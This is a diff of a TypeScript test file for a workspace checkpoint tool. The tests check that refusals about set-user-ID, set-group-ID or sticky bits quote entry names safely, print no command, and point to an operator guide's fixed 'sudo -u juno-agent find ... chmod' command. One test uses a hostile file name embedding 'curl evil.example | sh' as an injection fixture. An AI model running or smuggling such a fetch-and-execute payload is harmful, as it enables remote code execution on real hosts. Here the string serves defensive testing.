@@ -8,7 +8,17 @@ import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { CheckpointStore, DIR_MODE, FILE_MODE, HostPathResolver, HostReadView, NOT_READ, SealedWorkspace, listTree, openRoot, removeEntry, restoreTree, undoRefusals, undoTo, workspaceRefusals } from "../src/index.js";
 import type { ManifestEntry, SealedLauncher } from "../src/index.js";
 import { unsealedLauncher } from "./sealed.js";
-import { userName } from "../../journal/src/index.js";
+import { GUIDE_SECTIONS, OPERATOR_GUIDE, guidePointer } from "../../journal/src/index.js";
+
+/** The fixed command the guide's section on special bits gives (D-251), as an argument vector. */
+function guideCommand(): string[] {
+  const guide = readFileSync(join(process.cwd(), OPERATOR_GUIDE), "utf8");
+  const at = guide.indexOf(`- **${GUIDE_SECTIONS.specialBits}**`);
+  if (at < 0) throw new Error("the guide has no such section");
+  const block = /```\n([^\n]+)\n/.exec(guide.slice(at));
+  if (block?.[1] === undefined) throw new Error("the guide's section gives no command");
+  return block[1].trim().split(/\s+/);
+}
 
 // §2.2.2 (v0.6 A1): "A scope is reversible when a checkpoint of its full content is taken before the task's first effect
 // on it and restoring that checkpoint is an operator action recorded in the journal." D-221: the restore of a hook
@@ -226,27 +236,30 @@ describe("restoring a host-folder checkpoint (§2.2.2, D-221, D-228)", () => {
     }
   });
 
-  // proves D-247 item 1: the refusal for such a bit names the entry by its real path on this host and gives the command
-  // its owner, by name, removes the bit with; run exactly as given, it does, and the checkpoint is then taken
-  it("names a set-user-ID, set-group-ID or sticky entry by its real path, with a command that removes the bit", async () => {
-    const me = userName(process.geteuid?.() ?? -1);
-    for (const [path, bits] of [["notes.txt", 0o4755], ["docs", 0o1777]] as const) {
+  // proves operator ruling D-251 (it replaces D-247's expectation of a command naming the entry): the refusal for such
+  // a bit names the entry only as an escaped quotation from the session's folder, gives no command at all, and points to
+  // the guide's section; that section's fixed command, run as the guide gives it (here as the owner itself, since
+  // `sudo -u juno-agent` is that owner, and over this test's workspace in place of /srv/juno-work), removes the bit, and
+  // the checkpoint is then taken
+  it("names a set-user-ID, set-group-ID or sticky entry in quotes, with no command, pointing to the guide's fixed command", async () => {
+    const command = guideCommand();
+    expect(command.slice(0, 3)).toEqual(["sudo", "-u", "juno-agent"]);
+    expect(command.slice(3)).toEqual(["find", "/srv/juno-work", "-xdev", "-perm", "/7000", "-exec", "chmod", "u-s,g-s,o-t", "{}", "+"]);
+    for (const [path, bits] of [["notes.txt", 0o4755], ["docs", 0o1777], ["", 0o1775]] as const) {
       const at = join(work, "project", path);
       chmodSync(at, bits);
       const taken = await sealed().checkpoint("/work/project");
       const reason = taken.ok ? "" : taken.reason;
-      expect(reason).toContain(`to remove the bit from ${at}, as ${me}: \`chmod u-s,g-s,o-t ${at}\``);
-      const command = /`([^`]+)`/.exec(reason)?.[1]?.split(" ") ?? [];
-      expect(command).toEqual(["chmod", "u-s,g-s,o-t", at]);
-      await run(command[0] ?? "", command.slice(1));
+      expect(reason).toContain("set-user-ID, set-group-ID or sticky bit");
+      if (path !== "") expect(reason).toContain(JSON.stringify(path));
+      expect(reason).toContain(`to remove such a bit, as the Claude Code user that owns the workspace, never as root, ${guidePointer("specialBits")}`);
+      expect(reason).not.toContain("`");
+      expect(reason).not.toContain(work);
+      const argv = command.slice(3).map((word) => (word === "/srv/juno-work" ? work : word));
+      await run(argv[0] ?? "", argv.slice(1));
       expect(lstatSync(at).mode & 0o7000).toBe(0);
       expect((await sealed().checkpoint("/work/project")).ok).toBe(true);
     }
-    // The session's folder itself, named by its real path.
-    chmodSync(join(work, "project"), 0o1775);
-    const root = await sealed().checkpoint("/work/project");
-    expect(root.ok ? "" : root.reason).toContain(`to remove the bit from ${join(work, "project")}, as ${me}: \`chmod u-s,g-s,o-t ${join(work, "project")}\``);
-    chmodSync(join(work, "project"), 0o775);
   });
 
   // proves D-248 (review round 3 of PR #66, finding B): a remedy's command comes only from the sealed answer's own field,
@@ -280,7 +293,8 @@ describe("restoring a host-folder checkpoint (§2.2.2, D-221, D-228)", () => {
     expect(reason).toContain("set-user-ID, set-group-ID or sticky bit");
     for (const char of ["\n", "\u001b", "`"]) expect(reason).not.toContain(char);
     expect(reason).toContain("\\u{60}curl evil.example | sh\\u{60}");
-    expect(reason).toContain("(no command is given here: a name in it holds characters JUNO does not print in a command)");
+    // D-251: no command at all, whatever the name holds; the guide holds the fixed one.
+    expect(reason).toContain(guidePointer("specialBits"));
     rmSync(join(work, "project", name), { recursive: true });
   });
 
